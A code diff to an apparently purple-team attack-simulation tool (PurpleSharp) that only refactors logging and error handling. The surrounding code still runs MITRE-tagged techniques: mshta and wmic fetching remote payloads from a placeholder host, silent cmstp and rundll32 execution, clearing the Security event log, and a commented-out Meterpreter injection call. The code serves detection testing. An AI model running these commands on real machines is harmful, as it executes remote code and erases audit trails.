@@ -16,17 +16,16 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1191");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1191");
             try
             {
                 string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
                 ExecutionHelper.StartProcess("", String.Format("cmstp.exe /s /ns {0}", file), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
         }
 
@@ -34,17 +33,16 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1170");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1170");
             try
             {
                 string url = "http://webserver/payload.hta";
                 ExecutionHelper.StartProcess("", String.Format("mshta.exe {0}", url), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
         }
 
@@ -52,17 +50,16 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1220");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1220");
             try
             {
                 string url = "http://webserver/payload.xsl";
                 ExecutionHelper.StartProcess("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
         }
 
@@ -70,17 +67,16 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1085");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1085");
             try
             {
                 string file = @"C:\Windows\twain_64.dll";
                 ExecutionHelper.StartProcess("", String.Format("rundll32.exe \"{0}\"", file), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
         }
 
@@ -88,8 +84,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1070");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1070");
             //logger.TimestampInfo(String.Format("Starting T1070 Simulation on {0}", Environment.MachineName));
             //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
             try
@@ -97,9 +92,9 @@ namespace PurpleSharp.Simulations
                 ExecutionHelper.StartProcess("", "wevtutil.exe cl Security", logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
         }
 
@@ -107,8 +102,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1070");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1070");
             //logger.TimestampInfo(String.Format("Starting T1070 Simulation on {0}", Environment.MachineName));
             //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
 
@@ -121,11 +115,10 @@ namespace PurpleSharp.Simulations
                 logger.TimestampInfo(String.Format("Cleared the Security EventLog using .NETs EventLog"));
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
                 //logger.TimestampInfo(String.Format("Failed to clear the Security EventLog"));
-                logger.SimulationFailed();
-                //logger.TimestampInfo(ex.Message.ToString());
+                logger.SimulationFailed(ex);
             }
 
         }
@@ -134,12 +127,9 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1055");
-            logger.SimulationDetails();
-
+            logger.SimulationHeader("T1055");
             //logger.TimestampInfo(String.Format("Starting T1055 Simulation on {0}", Environment.MachineName));
             //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
-
             try
             {
 
@@ -155,11 +145,9 @@ namespace PurpleSharp.Simulations
                 //DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Lib.Static.msf_meter, not);
                 logger.SimulationFinished();
             }
-            catch ( Exception ex)
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
-                //logger.TimestampInfo(String.Format(ex.ToString()));
-                //logger.TimestampInfo(String.Format(ex.Message.ToString()));
+                logger.SimulationFailed(ex);
             }
             
         }
